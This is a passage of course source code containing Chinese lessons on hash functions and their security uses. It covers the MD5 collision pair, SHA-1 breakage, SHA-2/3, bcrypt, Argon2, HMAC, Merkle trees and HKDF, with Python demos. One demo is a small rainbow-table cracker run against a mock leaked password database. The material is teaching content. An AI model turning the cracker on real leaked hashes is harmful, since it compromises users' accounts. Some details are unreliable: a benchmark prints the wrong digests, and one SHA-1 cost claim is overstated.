碰撞对（由研究人员生成）\n# 这两个不同的二进制块产生完全相同的 MD5\nblock1 = bytes.fromhex(\n    \"d131dd02c5e6eec4693d9a0698aff95c\"\n    \"2fcab58712467eab4004583eb8fb7f89\"\n    \"55ad340609f4b30283e488832571415a\"\n    \"085125e8f7cdc99fd91dbdf280373c5b\"\n    \"d8823e3156348f5bae6dacd436c919c6\"\n    \"dd53e2b487da03fd02396306d248cda0\"\n    \"e99f33420f577ee8ce54b67080a80d1e\"\n    \"c69821bcb6a8839396f9652b6ff72a70\"\n)\n\nblock2 = bytes.fromhex(\n    \"d131dd02c5e6eec4693d9a0698aff95c\"\n    \"2fcab50712467eab4004583eb8fb7f89\"\n    \"55ad340609f4b30283e4888325f1415a\"\n    \"085125e8f7cdc99fd91dbd7280373c5b\"\n    \"d8823e3156348f5bae6dacd436c919c6\"\n    \"dd53e23487da03fd02396306d248cda0\"\n    \"e99f33420f577ee8ce54b67080280d1e\"\n    \"c69821bcb6a8839396f965ab6ff72a70\"\n)\n\nh1 = hashlib.md5(block1).hexdigest()\nh2 = hashlib.md5(block2).hexdigest()\n\nprint(f\"Block 1 MD5: {h1}\")\nprint(f\"Block 2 MD5: {h2}\")\nprint(f\"碰撞! 相同哈希: {h1 == h2}\")\nprint(f\"Block 1 SHA256: {hashlib.sha256(block1).hexdigest()[:16]}...\")\nprint(f\"Block 2 SHA256: {hashlib.sha256(block2).hexdigest()[:16]}...\")\nprint(f\"但 SHA-256 不同: {hashlib.sha256(block1).hexdigest() != hashlib.sha256(block2).hexdigest()}\")</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">安全警告</div><p>永远不要在任何安全场景使用 MD5。即使\"只是校验文件完整性\"也不行——攻击者可以精心构造一个与合法文件 MD5 相同但内容恶意的文件。</p></div>\n\n<h2>五、SHA-1 的兴衰</h2>\n<p>MD5 被攻破后，NIST 推荐的 <strong>SHA-1</strong>（Secure Hash Algorithm 1）成为主力。SHA-1 输出 160 位，比 MD5 的 128 位更长，结构也更复杂（80 轮 vs 64 轮）。</p>\n<p>然而，SHA-1 与 MD5 共享相似的 Merkle-Damgard 结构。王小云在 2005 年就展示了 SHA-1 的理论弱点，估计碰撞攻击复杂度约为 2<sup>69</sup>——远低于暴力搜索的 2<sup>80</sup>。</p>\n\n<h3>5.1 Google 的 SHAttered 攻击（2017）</h3>\n<p>2017 年 2 月，Google 宣布完成了<strong>第一个 SHA-1 实际碰撞</strong>。他们制造了两个内容完全不同的 PDF 文件，却拥有完全相同的 SHA-1 哈希值。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\n\n# 模拟 SHAttered 碰撞验证\n# Google 公开的两个碰撞 PDF 的 SHA-1 前缀相同\n# 这里我们演示 SHA-1 的脆弱性\n\n# 检查你的系统是否仍在使用 SHA-1\ndef check_sha1_usage():\n    \"\"\"演示为什么 SHA-1 不再安全\"\"\"\n    message = b\"Important document\"\n    sha1 = hashlib.sha1(message).hexdigest()\n    sha256 = hashlib.sha256(message).hexdigest()\n\n    print(f\"消息: {message.decode()}\")\n    print(f\"SHA-1  (160 bit): {sha1}\")\n    print(f\"SHA-256 (256 bit): {sha256}\")\n    print(f\"\\nSHA-1 碰撞攻击复杂度: ~2^63 (已被 Google 实现)\")\n    print(f\"SHA-256 碰撞攻击复杂度: ~2^128 (仍然安全)\")\n\ncheck_sha1_usage()\n\n# 2022 年，SHA-1 碰撞已能在几美元成本的 GPU 上实现\n# 所有主流浏览器在 2017 年就停止信任 SHA-1 签名的证书\nprint(\"\\nSHA-1 被弃用的时间线:\")\nprint(\"2005: 王小云展示理论攻击\")\nprint(\"2013: 微软宣布将弃 SHA-1\")\nprint(\"2014: Google Chrome 开始警告 SHA-1 证书\")\nprint(\"2017: Google SHAttered 实际碰撞\")\nprint(\"2020: 所有主流浏览器完全拒绝 SHA-1\")</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>六、SHA-2 家族：当前主力</h2>\n<p>SHA-2 不是一個算法，而是一个<strong>算法家族</strong>，由 NIST 在 2001 年发布。它们共享相似的设计哲学，但输出长度不同：</p>\n\n<table>\n<thead><tr><th>算法</th><th>输出位数</th><th>块大小</th><th>碰撞安全级别</th><th>典型用途</th></tr></thead>\n<tbody>\n<tr><td>SHA-224</td><td>224</td><td>512 bit</td><td>2<sup>112</sup></td><td>较少使用</td></tr>\n<tr><td>SHA-256</td><td>256</td><td>512 bit</td><td>2<sup>128</sup></td><td>TLS、比特币、证书</td></tr>\n<tr><td>SHA-384</td><td>384</td><td>1024 bit</td><td>2<sup>192</sup></td><td>TLS 1.3</td></tr>\n<tr><td>SHA-512</td><td>512</td><td>1024 bit</td><td>2<sup>256</sup></td><td>高安全需求场景</td></tr>\n</tbody>\n</table>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\nimport time\n\ndef benchmark_hashes(data, rounds=100000):\n    \"\"\"对比各哈希算法的速度和输出\"\"\"\n    algos = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']\n\n    print(f\"数据大小: {len(data)} 字节, 迭代 {rounds} 次\\n\")\n    print(f\"{'算法':<10} {'输出位数':<10} {'哈希值(前32字符)':<35} {'耗时(秒)':<10}\")\n    print(\"-\" * 70)\n\n    for algo in algos:\n        h = hashlib.new(algo)\n        start = time.time()\n        for _ in range(rounds):\n            h.update(data)\n            h = hashlib.new(algo)  # 重置\n        elapsed = time.time() - start\n        digest = h.hexdigest()[:32]\n        bits = len(h.digest()) * 8\n        print(f\"{algo:<10} {bits:<10} {digest:<35} {elapsed:<10.4f}\")\n\nbenchmark_hashes(b\"CyberEdu Cryptography Module\")</code></pre></div>\n\n<h3>6.1 SHA-256 的内部结构</h3>\n<p>SHA-256 处理 512 位的消息块，维护 8 个 32 位的状态变量（a-h）。每块经过 64 轮压缩，使用 6 个逻辑函数和 64 个常数（前 64 个素数的立方根的小数部分的前 32 位）。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># SHA-256 的前 8 个初始哈希值\n# 它们是前 8 个素数(2,3,5,7,11,13,17,19)的平方根的小数部分的前32位\nimport math\n\nprimes_8 = [2, 3, 5, 7, 11, 13, 17, 19]\ninitial_h = []\nfor p in primes_8:\n    frac = math.sqrt(p) - int(math.sqrt(p))\n    h_val = int(frac * (2**32))\n    initial_h.append(h_val)\n\nprint(\"SHA-256 初始哈希值 (H0-H7):\")\nfor i, h in enumerate(initial_h):\n    print(f\"  H{i} = 0x{h:08x}\")\n\n# 前 64 个常数 K（前 64 个素数的立方根）\nprimes_64 = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,\n             73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,\n             157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,\n             239,241,251,257,263,269,271,277,281,283,293,307,311]\nK = []\nfor p in primes_64:\n    frac = p ** (1/3) - int(p ** (1/3))\n    K.append(int(frac * (2**32)))\n\nprint(f\"\\nSHA-256 使用 {len(K)} 个常数 K（前3个）:\")\nfor i in range(3):\n    print(f\"  K[{i}] = 0x{K[i]:08x}  (来自素数 {primes_64[i]})\")</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>七、SHA-3：彻底不同的设计</h2>\n<p>2012 年，NIST 举办 SHA-3 竞赛，最终选择了由 Guido Bertoni 等人设计的 <strong>Keccak</strong> 算法。SHA-3 的革命性在于它完全放弃了 Merkle-Damgard 结构，采用<strong>海绵结构（Sponge Construction）</strong>。</p>\n\n<h3>7.1 海绵结构</h3>\n<p>海绵结构分两个阶段：</p>\n<ol>\n  <li><strong>吸收（Absorb）</strong>：将消息块逐块异或到内部状态中，每块后进行一次置换</li>\n  <li><strong>挤出（Squeeze）</strong>：从状态中提取输出，如果需要的输出比状态长，多次置换并提取</li>\n</ol>\n<p>核心置换函数 Keccak-f[1600] 操作一个 1600 位的状态矩阵（5×5×64 位），经过 24 轮复杂的位操作。这种设计天然抵抗 MD5/SHA-1/SHA-2 面临的那些长度扩展攻击。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\n\n# SHA-3 家族\nmessage = b\"CyberEdu: Learning cryptography deeply\"\n\nhashes = {\n    'SHA3-224': hashlib.sha3_224(message).hexdigest(),\n    'SHA3-256': hashlib.sha3_256(message).hexdigest(),\n    'SHA3-384': hashlib.sha3_384(message).hexdigest(),\n    'SHA3-512': hashlib.sha3_512(message).hexdigest(),\n}\n\nprint(f\"消息: {message.decode()}\\n\")\nfor name, h in hashes.items():\n    print(f\"{name}: {h}\")\n    print(f\"  长度: {len(h)//2} 字节 = {len(h)//2 * 8} 位\\n\")\n\n# SHAKE：可变长度输出的扩展哈希函数（XOF）\nshake128 = hashlib.shake_128(message).hexdigest(64)  # 输出 64 字节\nshake256 = hashlib.shake_256(message).hexdigest(64)\nprint(f\"SHAKE128 (64字节输出): {shake128}\")\nprint(f\"SHAKE256 (64字节输出): {shake256}\")</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">SHA-3 vs SHA-2</div><p>SHA-3 并不比 SHA-2\"更安全\"或\"更快\"——它们的价值在于<strong>设计完全不同</strong>。如果某天 SHA-2 被发现漏洞，SHA-3 因为完全不同的内部结构，很可能不受影响。这是密码学中的\"备用方案\"思维。</p></div>\n\n<h2>八、全面对比表</h2>\n\n<table>\n<thead><tr><th>属性</th><th>MD5</th><th>SHA-1</th><th>SHA-256</th><th>SHA-512</th><th>SHA3-256</th></tr></thead>\n<tbody>\n<tr><td>输出长度</td><td>128 位</td><td>160 位</td><td>256 位</td><td>512 位</td><td>256 位</td></tr>\n<tr><td>内部结构</td><td>Merkle-Damgard</td><td>Merkle-Damgard</td><td>Merkle-Damgard</td><td>Merkle-Damgard</td><td>Sponge</td></tr>\n<tr><td>轮数</td><td>64</td><td>80</td><td>64</td><td>80</td><td>24</td></tr>\n<tr><td>碰撞安全</td><td>已攻破</td><td>已攻破</td><td>安全</td><td>安全</td><td>安全</td></tr>\n<tr><td>长度扩展攻击</td><td>易受攻击</td><td>易受攻击</td><td>易受攻击</td><td>易受攻击</td><td>免疫</td></tr>\n<tr><td>当前状态</td><td>弃用</td><td>弃用</td><td>主力</td><td>高安全</td><td>推荐</td></tr>\n<tr><td>设计年份</td><td>1991</td><td>1995</td><td>2001</td><td>2001</td><td>2015</td></tr>\n</tbody>\n</table>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\n\ndef hash_comparison():\n    \"\"\"综合对比所有主流哈希算法\"\"\"\n    test_data = b\"The quick brown fox jumps over the lazy dog\"\n\n    algorithms = {\n        'MD5':      hashlib.md5,\n        'SHA-1':    hashlib.sha1,\n        'SHA-224':  hashlib.sha224,\n        'SHA-256':  hashlib.sha256,\n        'SHA-384':  hashlib.sha384,\n        'SHA-512':  hashlib.sha512,\n        'SHA3-256': hashlib.sha3_256,\n    }\n\n    print(f\"测试数据: {test_data.decode()}\\n\")\n    print(f\"{'算法':<12} {'输出长度':<10} {'哈希值':<70} {'状态':<8}\")\n    print(\"=\" * 105)\n\n    deprecated = {'MD5', 'SHA-1'}\n    for name, func in algorithms.items():\n        h = func(test_data).hexdigest()\n        bits = len(func(test_data).digest()) * 8\n        status = \"弃用\" if name in deprecated else \"安全\"\n        print(f\"{name:<12} {bits:<10} {h:<70} {status:<8}\")\n\nhash_comparison()</code></pre></div>\n\n<h2>九、生日攻击：哈希函数的通用威胁</h2>\n<p>为什么 128 位的 MD5 碰撞攻击复杂度是 2<sup>64</sup> 而不是 2<sup>128</sup>？答案来自概率论中的<strong>生日悖论</strong>。</p>\n<p>在一个房间里，只需要 23 个人就有 50% 的概率找到两人生日相同。类似地，对于 n 位哈希值，大约需要 2<sup>n/2</sup> 次尝试就能以高概率找到碰撞。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import random\nimport math\n\ndef birthday_attack_simulation(hash_bits, trials=100):\n    \"\"\"模拟生日攻击：估算找到碰撞所需的尝试次数\"\"\"\n    hash_space = 2 ** hash_bits\n    total_attempts = 0\n\n    for _ in range(trials):\n        seen = set()\n        attempts = 0\n        while True:\n            h = random.randint(0, hash_space - 1)\n            attempts += 1\n            if h in seen:\n                break\n            seen.add(h)\n        total_attempts += attempts\n\n    avg = total_attempts / trials\n    theoretical = math.sqrt(math.pi / 2 * hash_space)\n    print(f\"哈希位数: {hash_bits}\")\n    print(f\"平均尝试次数: {avg:.0f}\")\n    print(f\"理论预测 (sqrt(pi/2 * 2^n)): {theoretical:.0f}\")\n    print(f\"2^(n/2) 近似: {2**(hash_bits/2):.0f}\")\n\n# 用 16 位哈希模拟（实际运行可行）\nbirthday_attack_simulation(16)</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\n<ul>\n  <li>MD5（128 位，1991）和 SHA-1（160 位，1995）已被碰撞攻击攻破，永远不要使用</li>\n  <li>SHA-2 家族（SHA-256/384/512）是当前主力，仍然安全</li>\n  <li>SHA-3（Keccak）采用完全不同的海绵结构，是 SHA-2 的战略备份</li>\n  <li>生日攻击将碰撞搜索复杂度降到 2^(n/2)，所以 128 位哈希只有 64 位碰撞安全</li>\n  <li>选择哈希算法时：当前用 SHA-256 或 SHA-384，新项目可考虑 SHA3-256</li>\n</ul></div>\n</section>";
+
+SECTION_CONTENT["crypto-04-02"] = "<section id=\"crypto-04-02\" class=\"section\" data-key=\"crypto-04-02\">\n<div class=\"section-transition\"><p>理解了哈希函数的原理后，我们来看它在安全领域的实际应用。你可能每天都在不知不觉中使用哈希——登录网站时输入的密码、下载文件时的完整性校验、区块链中的挖矿——背后都是哈希函数在默默工作。</p></div>\n<div class=\"section-header\">\n  <span class=\"chapter-tag\">crypto-04 · 哈希函数</span>\n  <h1>哈希在安全中的应用</h1>\n  <p class=\"subtitle\">从密码存储到区块链，一个单向函数如何支撑数字安全？</p>\n</div>\n\n<h2>一、2012 年 LinkedIn 密码泄露事件</h2>\n<p>2012 年 6 月，LinkedIn 被黑客入侵，<strong>650 万个密码哈希</strong>被窃取并公布在网上。安全研究者几小时内就破解了大部分密码。原因：LinkedIn 使用了<strong>无盐的 SHA-1</strong> 来存储密码。</p>\n<p>攻击者使用预计算的彩虹表（rainbow table）——一个巨大的\"明文→哈希\"映射数据库——可以瞬间反查出原始密码。2016 年 LinkedIn 确认实际泄露量为 <strong>1.65 亿</strong>条，是初始报道的 25 倍。</p>\n<p>这个事件完美展示了<strong>哈希函数使用不当</strong>的后果。SHA-1 本身不是问题，问题是直接用 SHA-1 哈希密码而没有任何保护措施。</p>\n\n<h2>二、密码存储：从灾难到安全</h2>\n\n<h3>2.1 反面教材：直接哈希密码</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\n\n# 危险的做法！永远不要这样存储密码\ndef bad_password_store(password):\n    \"\"\"直接 SHA-256 哈希——容易被彩虹表攻击\"\"\"\n    return hashlib.sha256(password.encode()).hexdigest()\n\n# 模拟彩虹表攻击\ndef rainbow_table_attack(stored_hashes):\n    common_passwords = [\"123456\", \"password\", \"admin\", \"letmein\",\n                        \"welcome\", \"monkey\", \"dragon\", \"master\"]\n    # 预计算常见密码的哈希\n    rainbow = {hashlib.sha256(p.encode()).hexdigest(): p\n               for p in common_passwords}\n\n    cracked = {}\n    for user, h in stored_hashes.items():\n        if h in rainbow:\n            cracked[user] = rainbow[h]\n    return cracked\n\n# 模拟数据库泄露\ndb = {\n    \"alice\": bad_password_store(\"password\"),\n    \"bob\":   bad_password_store(\"dragon\"),\n    \"charlie\": bad_password_store(\"Xk9#mP2$vL\"),  # 强密码不在彩虹表中\n}\nprint(\"泄露的密码哈希:\")\nfor user, h in db.items():\n    print(f\"  {user}: {h[:16]}...\")\n\ncracked = rainbow_table_attack(db)\nprint(f\"\\n彩虹表破解结果: {cracked}\")</code></pre></div>\n\n<h3>2.2 加盐（Salt）：让彩虹表失效</h3>\n<p>盐是一个<strong>随机值</strong>，与密码拼接后再哈希。每个用户使用不同的盐，即使密码相同，哈希值也不同。彩虹表失效，因为攻击者需要为每个盐值重新计算整个表。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\nimport os\n\ndef salted_hash(password, salt=None):\n    \"\"\"加盐哈希——盐使彩虹表失效\"\"\"\n    if salt is None:\n        salt = os.urandom(16)  # 16 字节随机盐\n    pwd_bytes = password.encode('utf-8')\n    h = hashlib.sha256(salt + pwd_bytes).hexdigest()\n    return salt.hex(), h\n\n# 同一密码，不同盐，不同哈希\nsalt1, h1 = salted_hash(\"password\")\nsalt2, h2 = salted_hash(\"password\")\nprint(f\"盐1: {salt1}, 哈希1: {h1[:16]}...\")\nprint(f\"盐2: {salt2}, 哈希2: {h2[:16]}...\")\nprint(f\"哈希不同: {h1 != h2}\")</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>2.3 bcrypt：慢才是安全</h3>\n<p>加盐解决了彩虹表问题，但 GPU 和 ASIC 的高速计算能力意味着攻击者仍可逐用户暴力破解。解决方案：<strong>故意让哈希变慢</strong>。</p>\n<p><strong>bcrypt</strong>（1999 年设计）使用 Blowfish 加密算法的核心——Eksblowfish 密钥编排——使得每次哈希计算需要大量内存访问，有效抵抗 GPU 并行攻击。关键特性：<strong>可调工作因子（cost factor）</strong>，随着硬件进步可以增大。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import bcrypt\nimport time\n\n# bcrypt 密码哈希\npassword = b\"MyS3cur3P@ssw0rd!\"\n\n# cost factor = 12 (2^12 = 4096 轮)\nstart = time.time()\nhashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))\nhash_time = time.time() - start\nprint(f\"哈希: {hashed.decode()}\")\nprint(f\"耗时: {hash_time:.4f} 秒\")\n\n# 验证密码\nstart = time.time()\nis_valid = bcrypt.checkpw(password, hashed)\nverify_time = time.time() - start\nprint(f\"验证正确密码: {is_valid} ({verify_time:.4f}s)\")\n\nis_wrong = bcrypt.checkpw(b\"wrong_password\", hashed)\nprint(f\"验证错误密码: {is_wrong}\")\n\n# 工作因子的影响\nprint(\"\\n工作因子对速度的影响:\")\nfor cost in [8, 10, 12, 14]:\n    start = time.time()\n    bcrypt.hashpw(password, bcrypt.gensalt(rounds=cost))\n    elapsed = time.time() - start\n    print(f\"  cost={cost:2d}: {elapsed:.4f}s (2^{cost} = {2**cost} 轮)\")</code></pre></div>\n\n<h3>2.4 Argon2：现代密码哈希之王</h3>\n<p><strong>Argon2</strong> 赢得了 2015 年密码哈希竞赛（Password Hashing Competition），是目前最推荐的密码哈希算法。它的核心优势：<strong>内存硬</strong>（Memory-hard）——计算时需要占用大量内存，使得 ASIC 和 GPU 攻击成本极高。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from argon2 import PasswordHasher\nfrom argon2.exceptions import VerifyMismatchError\n\nph = PasswordHasher(\n    time_cost=3,        # 迭代次数\n    memory_cost=65536,  # 64 MB 内存\n    parallelism=4,      # 并行度\n    hash_len=32,        # 输出长度\n    salt_len=16         # 盐长度\n)\n\n# 哈希密码\npassword = \"CyberEdu2024!\"\nhashed = ph.hash(password)\nprint(f\"Argon2id 哈希: {hashed}\")\n\n# 验证\ntry:\n    ph.verify(hashed, password)\n    print(\"密码正确!\")\nexcept VerifyMismatchError:\n    print(\"密码错误!\")\n\n# 检查是否需要重新哈希（参数升级时）\nif ph.check_needs_rehash(hashed):\n    print(\"建议重新哈希（参数已更新）\")</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">密码存储最佳实践</div><p>优先级：Argon2id > scrypt > bcrypt > PBKDF2。永远不要：直接用 MD5/SHA 哈希密码、不设盐、使用固定盐、自行发明哈希方案。</p></div>\n\n<h2>三、HMAC：带密钥的哈希</h2>\n<p>普通哈希无法防止篡改——攻击者修改消息后可以重新计算哈希。如果发送方和接收方共享一个<strong>密钥</strong>，我们可以用<strong>HMAC（Hash-based Message Authentication Code）</strong>同时验证消息的完整性和来源。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hmac\nimport hashlib\n\n# 共享密钥\nsecret_key = b\"super_secret_key_2024\"\n\ndef create_hmac(message, key):\n    \"\"\"创建 HMAC-SHA256 认证码\"\"\"\n    return hmac.new(key, message.encode(), hashlib.sha256).hexdigest()\n\ndef verify_hmac(message, key, received_mac):\n    \"\"\"验证 HMAC\"\"\"\n    expected_mac = create_hmac(message, key)\n    # 使用时间安全的比较函数，防止计时攻击\n    return hmac.compare_digest(expected_mac, received_mac)\n\n# Alice 发送消息\nmessage = \"转账 1000 元给 Bob\"\nmac = create_hmac(message, secret_key)\nprint(f\"消息: {message}\")\nprint(f\"HMAC: {mac}\")\n\n# Bob 验证\nprint(f\"\\n验证原始消息: {verify_hmac(message, secret_key, mac)}\")\n\n# 攻击者篡改消息\ntampered = \"转账 9999 元给 Eve\"\nprint(f\"验证篡改消息: {verify_hmac(tampered, secret_key, mac)}\")\n\n# 攻击者不知道密钥，无法伪造有效 HMAC\nattacker_mac = create_hmac(tampered, b\"wrong_key\")\nprint(f\"攻击者伪造 HMAC: {verify_hmac(tampered, secret_key, attacker_mac)}\")</code></pre></div>\n\n<h3>3.1 HMAC 的内部结构</h3>\n<p>HMAC 的精妙之处在于它<strong>两次</strong>使用哈希函数：</p>\n<p>HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))</p>\n<p>其中 K' 是处理后的密钥（如果密钥太长则先哈希，太短则补零），opad = 0x5c5c5c...，ipad = 0x363636...。这种双重哈希结构被证明是安全的，即使底层哈希函数有某些弱点（如 MD5 的碰撞弱点），HMAC-MD5 仍然安全。</p>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>四、Merkle 树：大数据的完整性证明</h2>\n<p>如果你下载了一个 10GB 的文件，只需要验证一个哈希值就能确认完整性。但如果下载中断了，你需要知道<em>哪个部分</em>出了问题。这就是 <strong>Merkle 树</strong>的用途。</p>\n<p>Merkle 树将数据分成块，每块计算哈希，然后两两配对再哈希，层层向上，最终得到一个<strong>根哈希（Root Hash）</strong>。任何一块数据被篡改，根哈希就会改变。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\nimport math\n\ndef build_merkle_tree(data_blocks):\n    \"\"\"构建 Merkle 树\"\"\"\n    # 叶子节点：每个数据块的哈希\n    leaves = [hashlib.sha256(block).hexdigest() for block in data_blocks]\n\n    # 如果叶子数量为奇数，复制最后一个\n    if len(leaves) % 2 == 1:\n        leaves.append(leaves[-1])\n\n    tree = [leaves]  # 保存每一层\n\n    current_level = leaves\n    while len(current_level) > 1:\n        next_level = []\n        for i in range(0, len(current_level), 2):\n            combined = current_level[i] + current_level[i+1]\n            parent = hashlib.sha256(combined.encode()).hexdigest()\n            next_level.append(parent)\n        if len(next_level) % 2 == 1 and len(next_level) > 1:\n            next_level.append(next_level[-1])\n        tree.append(next_level)\n        current_level = next_level\n\n    root = current_level[0]\n    return tree, root\n\ndef verify_block(block_index, block_data, tree, root_hash):\n    \"\"\"验证单个数据块的完整性（Merkle Proof）\"\"\"\n    proof_hash = hashlib.sha256(block_data).hexdigest()\n\n    # 从叶子向上验证\n    level = 0\n    idx = block_index\n    while level < len(tree) - 1:\n        sibling_idx = idx + 1 if idx % 2 == 0 else idx - 1\n        if sibling_idx < len(tree[level]):\n            sibling_hash = tree[level][sibling_idx]\n        else:\n            sibling_hash = tree[level][idx]\n\n        if idx % 2 == 0:\n            combined = proof_hash + sibling_hash\n        else:\n            combined = sibling_hash + proof_hash\n\n        proof_hash = hashlib.sha256(combined.encode()).hexdigest()\n        idx = idx // 2\n        level += 1\n\n    return proof_hash == root_hash\n\n# 构建示例\nblocks = [b\"block0\", b\"block1\", b\"block2\", b\"block3\",\n          b\"block4\", b\"block5\", b\"block6\", b\"block7\"]\ntree, root = build_merkle_tree(blocks)\n\nprint(f\"Merkle 根哈希: {root[:32]}...\")\nprint(f\"树的层数: {len(tree)}\")\nfor i, level in enumerate(tree):\n    label = \"叶子\" if i == 0 else (\"根\" if i == len(tree)-1 else f\"层{i}\")\n    print(f\"  {label}: {len(level)} 个节点\")\n\n# 验证\nprint(f\"\\n验证 block3 完整: {verify_block(3, b'block3', tree, root)}\")\nprint(f\"验证篡改 block3: {verify_block(3, b'TAMPERED', tree, root)}\")</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">区块链与 Merkle 树</div><p>比特币的每个区块包含数千笔交易。用 Merkle 树将所有交易的哈希汇聚成一个根哈希写入区块头。轻客户端（SPV 节点）只需下载区块头和 Merkle Proof（约 1KB），就能验证任何一笔交易是否被包含，无需下载完整区块。</p></div>\n\n<h2>五、文件完整性校验</h2>\n<p>当你从网上下载软件时，如何确认文件没有被篡改？</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\n\ndef file_checksum(filepath_or_data, algorithm='sha256'):\n    \"\"\"计算文件或数据的校验和\"\"\"\n    h = hashlib.new(algorithm)\n    if isinstance(filepath_or_data, bytes):\n        h.update(filepath_or_data)\n    else:\n        with open(filepath_or_data, 'rb') as f:\n            for chunk in iter(lambda: f.read(8192), b''):\n                h.update(chunk)\n    return h.hexdigest()\n\n# 模拟下载验证\nfile_data = b\"This is the legitimate software v2.0 installer...\"\nofficial_hash = file_checksum(file_data, 'sha256')\nprint(f\"官方 SHA-256: {official_hash}\")\n\n# 下载后验证\ndownloaded = file_data  # 模拟下载完成\ndownloaded_hash = file_checksum(downloaded, 'sha256')\nprint(f\"下载 SHA-256: {downloaded_hash}\")\nprint(f\"文件完整: {official_hash == downloaded_hash}\")\n\n# 模拟文件被篡改（中间人注入恶意代码）\ntampered = file_data + b\"\\n// malicious backdoor code\"\ntampered_hash = file_checksum(tampered, 'sha256')\nprint(f\"\\n篡改后 SHA-256: {tampered_hash}\")\nprint(f\"文件完整: {official_hash == tampered_hash}\")\nprint(f\"被检测为篡改!\")</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>六、HKDF：从密钥材料中提取密钥</h2>\n<p>在 TLS 等协议中，密钥交换产生一个共享秘密（如 Diffie-Hellman 的输出），但这个原始秘密不适合直接用作加密密钥。<strong>HKDF（HMAC-based Key Derivation Function）</strong>用于从密钥材料中提取一个或多个高质量密钥。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\nimport hmac\nimport os\n\ndef hkdf_extract(salt, ikm):\n    \"\"\"HKDF 提取阶段\"\"\"\n    if salt is None:\n        salt = b'\\x00' * 32  # SHA-256 哈希长度\n    return hmac.new(salt, ikm, hashlib.sha256).digest()\n\ndef hkdf_expand(prk, info, length):\n    \"\"\"HKDF 扩展阶段\"\"\"\n    hash_len = 32  # SHA-256 输出长度\n    n = math.ceil(length / hash_len)\n    okm = b''\n    t = b''\n    for i in range(1, n + 1):\n        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()\n        okm += t\n    return okm[:length]\n\nimport math\n\n# 模拟 DH 密钥交换产生的共享秘密\nshared_secret = os.urandom(32)\n\n# 使用 HKDF 派生多个密钥\nsalt = os.urandom(16)\nprk = hkdf_extract(salt, shared_secret)\n\naes_key = hkdf_expand(prk, b\"AES-256-GCM encryption key\", 32)\nhmac_key = hkdf_expand(prk, b\"HMAC-SHA256 authentication key\", 32)\niv = hkdf_expand(prk, b\"Initialization vector\", 12)\n\nprint(f\"共享秘密: {shared_secret.hex()[:32]}...\")\nprint(f\"AES 密钥 (32字节): {aes_key.hex()}\")\nprint(f\"HMAC 密钥 (32字节): {hmac_key.hex()}\")\nprint(f\"IV (12字节): {iv.hex()}\")</code></pre></div>\n\n<h2>七、零知识证明与哈希承诺</h2>\n<p>哈希函数还支撑着一种有趣的密码学协议——<strong>承诺方案（Commitment Scheme）</strong>。你可以在不揭示信息的情况下\"承诺\"一个值，之后再\"揭示\"它，对方可以验证你确实早就知道这个值。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\nimport os\n\ndef commit(value):\n    \"\"\"承诺阶段：隐藏值，生成承诺\"\"\"\n    randomness = os.urandom(32)  # 随机数防止猜测\n    commitment = hashlib.sha256(randomness + value.encode()).hexdigest()\n    return commitment, randomness\n\ndef verify(commitment, value, randomness):\n    \"\"\"揭示阶段：验证承诺\"\"\"\n    recomputed = hashlib.sha256(randomness + value.encode()).hexdigest()\n    return recomputed == commitment\n\n# 场景：Alice 和 Bob 远程玩\"石头剪刀布\"\n# 问题：谁先出谁吃亏（对方可以看到后选择赢的）\n# 解决：先承诺，再揭示\n\n# 第一轮：双方同时承诺\nalice_choice = \"rock\"\nalice_commit, alice_rand = commit(alice_choice)\nbob_choice = \"paper\"\nbob_commit, bob_rand = commit(bob_choice)\n\nprint(f\"Alice 承诺: {alice_commit[:16]}...\")\nprint(f\"Bob 承诺:   {bob_commit[:16]}...\")\nprint(\"（此时双方都不知道对方的选择）\\n\")\n\n# 第二轮：双方揭示\nprint(f\"Alice 出: {alice_choice}\")\nprint(f\"Bob 出:   {bob_choice}\")\nprint(f\"Alice 承诺验证: {verify(alice_commit, alice_choice, alice_rand)}\")\nprint(f\"Bob 承诺验证:   